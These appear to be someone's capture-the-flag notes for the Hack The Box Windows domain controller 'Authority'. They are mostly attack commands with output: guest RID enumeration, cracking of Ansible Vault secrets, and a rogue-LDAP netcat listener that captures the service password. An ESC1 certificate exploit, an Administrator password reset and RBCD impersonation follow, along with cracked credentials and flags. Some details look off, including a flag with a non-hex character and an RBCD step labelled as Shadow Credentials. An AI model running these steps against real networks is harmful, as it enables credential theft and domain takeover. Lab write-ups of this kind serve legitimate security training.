# Authority
- Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb)
- Creds
```

```

## NMAP
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm


389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-06T16:37:04+00:00; +3h59m58s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-06T16:37:03+00:00; +3h59m58s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-06T16:37:04+00:00; +3h59m58s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
```

## Foothold
- `nxc smb 10.129.229.56 -u 'guest' -p '' --rid-brute`
```
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\guest:
SMB         10.129.229.56   445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        501: HTB\Guest (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
```
- SMB null access on Development
- found `ansible_inventory` in PWM - contains ldap creds
- found PWM/defaults/main.yml having secrets
- arrange hashes like in `ldap-pass.enc, pwm-user.enc, pwm-pass.enc`
```
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764%
```
- `ansible2john hash.txt > john1.txt`
    - `john --wordlist=rockyou.txt john1.txt`
    - `!@#$%^&*` - we can use this with ansible-vault
- `ansible-vault view ldap-pass.enc`
```
admin_login:svc_pwm
admin_password:pWm_@dm!N_!23
ldap_admin:DevT3st@123
```
- authenticate into the app using the above admin creds for pwm
- go to the `Configration Editor` > `LDAP Directories` > `Default , Connection`
- start nc -nvlp 636 and change the ldap url to `ldap://10.10.14.246:636`
- Click on `test LDAP Profile` to get a call back on nc with the password for `svc_ldap`
- `svc_ldap:lDaP_1n_th3_cle4r!`
- winrm to get the user.txt - 912df6d38613c89df3a9c44b87q560ac2

## PrivEsc
- machine has `SeMachineAccountPrivileges` to add computers.
- found a cert containing svc_ldap.pfx. we might have some certificate exploits
- running bloodhound - found nothing
- `certipy-ad find -vulnerable -dc-ip 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`
    - Vulnerable to ESC1 on domain computers
#### Exploiting above
1. Add a new computer to the AD
- `bloodyAD -d 'authority.htb' --dc-ip '10.129.229.56' -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' add computer 'EVIL-PC' 'Password123!'`

2. request pfx on behalf of the evil computer `EVIL-PC$` - always add dollar ($) at the end.
```
certipy-ad req \
    -u 'EVIL-PC$' -p 'Password123!' \
    -dc-ip 10.129.229.56 -dns 'authority.htb' \
    -ca 'AUTHORITY-CA' -template 'CorpVPN' \
    -upn 'administrator@authority.htb'
```

3. get NT hash
- `certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.229.56`

- returns a KRR_ERR_GENERIC (Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)) - some session issue not generating the pkinit file

1. Extract the private key (unencrypted)
- `certipy-ad cert -pfx administrator_authority.pfx -nocert -out administrator.key`

2. Extract the certificate
- `certipy-ad cert -pfx administrator_authority.pfx -nokey -out administrator.crt`


**1st Method**
- Change the admin password
- `bloodyAD -d authority.htb -s -u Administrator -c 'administrator.key:administrator.crt' --dc-ip 10.129.229.56 set password Administrator 'KrazyMessi!'`
**OR**
- `certipy-ad account update -user Administrator -password 'KrazyMessi!' -u 'EVIL-PC$' -p 'Password123!' -pfx administrator.pfx -dc-ip 10.129.229.56 `

- evil-winrm to get Administrator and root.txt - cba5b9d7c1386cbd278487abd81e5bcb


**2nd Method**
- To get the NT Hash of the Administrator (via Shadow Credentials/KeyCredentialLink)
- `python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'EVIL-PC$'`
- `impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/EVIL-PC$:Password123!'`

